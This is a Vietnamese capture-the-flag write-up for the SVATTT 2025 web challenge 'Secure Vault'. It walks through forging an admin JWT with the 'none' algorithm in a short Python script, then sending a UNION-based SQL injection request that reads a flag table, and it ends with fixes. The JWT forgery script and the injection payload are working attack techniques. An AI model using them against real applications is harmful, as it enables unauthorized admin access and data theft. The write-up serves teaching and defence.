---
title: "[SVATTT 2025] Web - Secure Vault (JWT None Algorithm & SQL Injection)"
date: 2026-03-15
categories: ["SVATTT 2025 Challenges"]
description: "Phân tích và khai thác chuỗi lỗ hổng SQL Injection kết hợp JWT algorithm confusion để chiếm quyền admin và đọc flag bí mật."
showAuthor: false
showTableOfContents: true
---

## Thông tin bài thi
* **Giải đấu**: Sinh viên với An toàn thông tin (SVATTT)
* **Thể loại**: Web Exploitation
* **Điểm số**: 350 pts
* **Độ khó**: Medium

---

## 1. Phân tích đề bài & Trinh sát

Bài thi cung cấp một ứng dụng web quản lý tài liệu nội bộ với chức năng đăng nhập, đăng ký và khu vực `Admin Panel` chỉ dành cho tài khoản có role `admin`.

Khi phân tích gói tin HTTP gửi lên từ trình duyệt qua **Burp Suite**, ta nhận thấy phiên đăng nhập được xác thực thông qua header `Authorization: Bearer <token>`.

### Kiểm tra cấu trúc JWT Token:
Token có dạng 3 phần base64:
```json
// Header
{
  "alg": "HS256",
  "typ": "JWT"
}

// Payload
{
  "sub": "guest",
  "role": "user",
  "exp": 1773588000
}
```

---

## 2. Tìm kiếm lỗ hổng

### Lỗ hổng 1: JWT Signature Verification Bypass (`alg: "none"`)
Kiểm tra backend xử lý token: server sử dụng thư viện cũ và cho phép chấp nhận thuật toán `none` mà không ép buộc secret key khi verify.

### Lỗ hổng 2: SQL Injection tại Endpoint `/api/v1/vault`
Sau khi có quyền user thông thường, endpoint tìm kiếm tài liệu `/api/v1/vault?search=` xuất hiện lỗi khi chèn dấu nháy đơn `'`:

```http
GET /api/v1/vault?search=test' HTTP/1.1
Host: target.svattt.ctf
Authorization: Bearer ey...

HTTP/1.1 500 Internal Server Error
{"error": "sqlite3.OperationalError: unrecognized token: \"'\""}
```

Rõ ràng backend ghép chuỗi trực tiếp vào truy vấn SQLite!

---

## 3. Khai thác lỗ hổng

### Bước 1: Giả mạo token Admin bằng Python
Ta tạo script forge JWT với `alg: "none"` và `role: "admin"`:

```python
import base64
import json
import requests

# Payload admin
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "guest", "role": "admin", "exp": 1773588000}

def b64_encode(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip("=")

forged_jwt = f"{b64_encode(header)}.{b64_encode(payload)}."
print(f"[+] Forged JWT: {forged_jwt}")
```

### Bước 2: Khai thác SQL Injection UNION SELECT để trích xuất Flag
Sử dụng token vừa tạo, gửi request khai thác UNION-based SQLi để đọc bảng `flags`:

```http
GET /api/v1/vault?search=' UNION SELECT 1, flag, 'admin' FROM flags-- HTTP/1.1
Host: target.svattt.ctf
Authorization: Bearer eyJhbGciOiAibm9uZ...
```

**Response**:
```json
{
  "status": "success",
  "results": [
    {
      "id": 1,
      "title": "SVATTT{jwt_n0n3_4lg_c0mb1n3d_w1th_sql1_77a9b2}",
      "author": "admin"
    }
  ]
}
```

**Flag**: `SVATTT{jwt_n0n3_4lg_c0mb1n3d_w1th_sql1_77a9b2}`

---

## 4. Biện pháp khắc phục

1. **Về JWT**:
   - Khóa chặt danh sách thuật toán hợp lệ trên server (`algorithms=['HS256']`). Tuyệt đối cấm thuật toán `none`.
   - Lưu trữ secret key an toàn trong file biến môi trường (`.env`), không hardcode.

2. **Về SQL Injection**:
   - Luôn sử dụng **Prepared Statements / Parameterized Queries**:
   ```python
   cursor.execute("SELECT id, title, author FROM documents WHERE title LIKE ?", (f"%{search_query}%",))
   ```
